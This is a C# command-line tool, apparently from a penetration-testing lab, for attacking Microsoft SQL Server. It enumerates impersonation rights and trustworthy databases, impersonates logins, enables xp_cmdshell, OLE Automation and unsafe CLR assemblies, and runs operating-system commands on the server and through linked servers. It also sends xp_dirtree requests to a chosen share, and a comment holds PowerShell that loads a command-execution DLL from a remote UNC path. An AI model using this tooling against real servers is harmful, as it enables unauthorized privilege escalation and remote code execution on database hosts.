using CommandLine;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.Data.SqlClient;
using System.Security.Cryptography;
using System.Text;

namespace SQLCommands
{
    internal class Program
    {

        public class Options 
        {
            [Option('I', "impersonate-login", Required = false, HelpText = "Impersonates a login")]
            public string ImpersonateLogin { get; set; }

            [Option('i', "impersonate-user", Required = false, HelpText = "Impersonates a user")]
            public string ImpersonateUser { get; set; }

            [Option('a', "action", Required = true, HelpText = "Action to perform")]
            public string Action { get; set; }

            [Option('q', "query", Required = false, HelpText = "Query to execute")]
            public string Query { get; set; }

            [Option('s', "server", Required = true, HelpText = "Server to cnnect to.")]
            public string Server { get; set; }

            [Option('f', "share", Required = false, HelpText = "Share for xp_dirtree")]
            public string Share { get; set; }

            [Option('c', "command", Required = false, HelpText = "Command for xp_cmdshell")]
            public string Command { get; set; }

            [Option('e', "exec-in-link", Required = false, HelpText = "Linked server to execute the command")]
            public string ExecInLink { get; set; }

            [Option('d', "database", Default ="master", Required = false, HelpText = "Database to connect to")]
            public string Database { get; set; }

            [Option('u', "username", Required = false, HelpText = "User to login with")]
            public string Username { get; set; }

            [Option('p', "password", Required = false, HelpText = "Password of the user")]
            public string Password { get; set; }
        }


        static void Main(string[] args)
        {
            
            CommandLine.Parser.Default.ParseArguments<Options>(args)
                .WithParsed(RunOptions)
                .WithNotParsed(HandleParseError);

        }

        static void RunOptions(Options opts)
        {
            String conString = BuildConnectionString(opts);
            SqlConnection con = GetSQLConnection(conString);

            // SELECT HAS_PERMS_BY_NAME('dbo', 'USER', 'IMPERSONATE');

            String query = opts.Query;

            string action = opts.Action;

            if (opts.ImpersonateLogin != null)
            {
                query = String.Format("EXECUTE AS LOGIN = '{0}';", opts.ImpersonateLogin);
                ExecuteSQLQuery(query, con);
            }

            if (opts.ImpersonateUser != null)
            {
                if (opts.Database == null)
                {
                    Console.WriteLine("You must specify a database -d or --database");
                    con.Close();
                    Environment.Exit(0);
                }
                query = String.Format("use {0}; EXECUTE AS USER = '{1}';", opts.Database, opts.ImpersonateUser);
                ExecuteSQLQuery(query, con);
            }

            if (action == "getuser")
            {
                GetUserAndRole(con);
                con.Close();
                return;
            }

            if (action == "execcmd" && opts.Command == null)
            {
                Console.WriteLine("Please enter a command to execute -c or --command");
                con.Close();
                Environment.Exit(0);
            }

            if (action == "dirtree" && opts.Share == null)
            {
                Console.WriteLine("Please enter a share address -f or --share");
                con.Close();
                Environment.Exit(0);
            }

            if (action == "enableclr" && opts.Database == null)
            {
                Console.WriteLine("You must specify a database with TRUSTWORTHY property set -d or --database");
                con.Close();
                Environment.Exit(0);
            }

            switch (action)
            {
                case "enumimpersonation":
                    //query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
                    query = "SELECT sp2.name AS LoginName, sp.permission_name AS PermType, sp3.name AS PermTarget FROM sys.server_permissions sp LEFT JOIN sys.server_principals sp2 on sp2.principal_id = sp.grantee_principal_id LEFT JOIN sys.server_principals sp3 on sp3.principal_id = sp.major_id WHERE sp.type = 'IM';";
                    break;
                case "findtrustw":
                    query = "SELECT SUSER_SNAME(owner_sid) AS DBOWNER, d.name AS DATABASENAME FROM sys.server_principals r INNER JOIN sys.server_role_members m ON r.principal_id = m.role_principal_id INNER JOIN sys.server_principals p ON p.principal_id = m.member_principal_id INNER JOIN sys.databases d ON suser_sname(d.owner_sid) = p.name WHERE is_trustworthy_on = 1;";
                    break;
                case "linked":
                    query = "EXEC sp_linkedservers;";
                    break;
                case "enablecmd":
                    query = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
                    break;
                case "enableole":
                    query = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
                    break;
                case "enableclr":
                    query = String.Format("use {0}; EXEC sp_configure 'show advanced options',1 RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE;", opts.Database);
                    break;
                case "execolecmd":
                    query = String.Format("DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, '{0}';", opts.Command);
                    break;
                case "createproc":
                    // Needs dll in victim's system
                    query = "CREATE ASSEMBLY myAssembly FROM 'c:\\tools\\cmdExec.dll' WITH PERMISSION_SET = UNSAFE;";
                    // Possible to pass the assembly as hex string use below powershell
                    /*
                     $assemblyFile = "\\192.168.119.120\visualstudio\Sql\cmdExec\bin\x64\Release\cmdExec.dll"
                     $stringBuilder = New-Object -Type System.Text.StringBuilder 

                     $fileStream = [IO.File]::OpenRead($assemblyFile)
                     while (($byte = $fileStream.ReadByte()) -gt -1) {
                         $stringBuilder.Append($byte.ToString("X2")) | Out-Null
                     }
                     $stringBuilder.ToString() -join "" | Out-File c:\Tools\cmdExec.txt
                     */
                    // query = "CREATE ASSEMBLY my_assembly FROM 0x4D5A900..... WITH PERMISSION_SET = UNSAFE;";
                    query += "CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];";
                    query += String.Format("EXEC cmdExec '{0}';", opts.Command);
                    break;
                case "execcmd":
                    query = String.Format("EXEC xp_cmdshell '{0}';", opts.Command);
                    break;
                case "dirtree":
                    query = String.Format("EXEC master..xp_dirtree '{0}', 1, 1;", opts.Share);
                    break;

            }
            if (opts.ExecInLink != null)
            {
                //query = String.Format("select * from openquery(\"{0}\", '{1}')", opts.ExecInLink, query.Replace("'", "''"));
                query = String.Format("EXEC ('{0}') AT {1}", query.Replace("'", "''"), opts.ExecInLink);
            }
            ExecuteSQLQuery(query, con);

            con.Close();
        }

        static void HandleParseError(IEnumerable<Error> errs)
        {

        }

        static String BuildConnectionString(Options opts)
        {
            StringBuilder sb = new StringBuilder(String.Format("Server = {0};Database = {1}", opts.Server, opts.Database));
            if (opts.Username != null && opts.Password != null)
            {
                // Console.WriteLine(String.Format("; User ID={0}; Password={1};", opts.Username, opts.Password));
                sb.Append(String.Format("; User ID={0}; Password={1};", opts.Username, opts.Password));
            }
            else
            {
                sb.Append("; Integrated Security = True;");
            }
            return sb.ToString();
        }
        static SqlConnection GetSQLConnection(String conString)
        {
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch (Exception ex) when (ex is SqlException || ex is InvalidOperationException)
            {
                Console.WriteLine("Auth failed");
                Console.WriteLine(ex.ToString());
                Environment.Exit(0);
            }
            return con;
        }

        private static void ReadSingleRow(IDataRecord dataRecord)
        {
            int fieldCount = dataRecord.FieldCount;
            string[] results = new string[fieldCount];
            for (int i = 0; i < fieldCount; i++)
            {
                results[i] = dataRecord[i].ToString();
            }
            Console.WriteLine(String.Join("  |  ", results));
        }

        private static void GetUserAndRole(SqlConnection con)
        {
            String query = "SELECT SYSTEM_USER;";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Logged in as: " + reader[0]);
            reader.Close();

            query = "SELECT IS_SRVROLEMEMBER('public');";
            command = new SqlCommand(query, con);
            reader = command.ExecuteReader();
            reader.Read();
            Int32 role = Int32.Parse(reader[0].ToString());
            reader.Close();

            String result = "User is a member of public role";
            if (role != 1)
            {
                result = "User is NOT a member of public role";
            }

            query = "SELECT IS_SRVROLEMEMBER('sysadmin');";
            command = new SqlCommand(query, con);
            reader = command.ExecuteReader();
            reader.Read();
            role = Int32.Parse(reader[0].ToString());
            reader.Close();

            result = "User is a member of sysadmin role";
            if (role != 1)
            {
                result = "User is NOT a member of sysadmin role";
            }
            Console.WriteLine(result);
        }

        private static void ExecuteSQLQuery(String query, SqlConnection con)
        {
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            if (!reader.HasRows)
            {
                Console.WriteLine("Query has no results");
                //reader.Close();
                //return;
            }
            while (reader.Read())
            {
                ReadSingleRow((IDataRecord)reader);
            }
            reader.Close();
            //return;
        }
    }
}
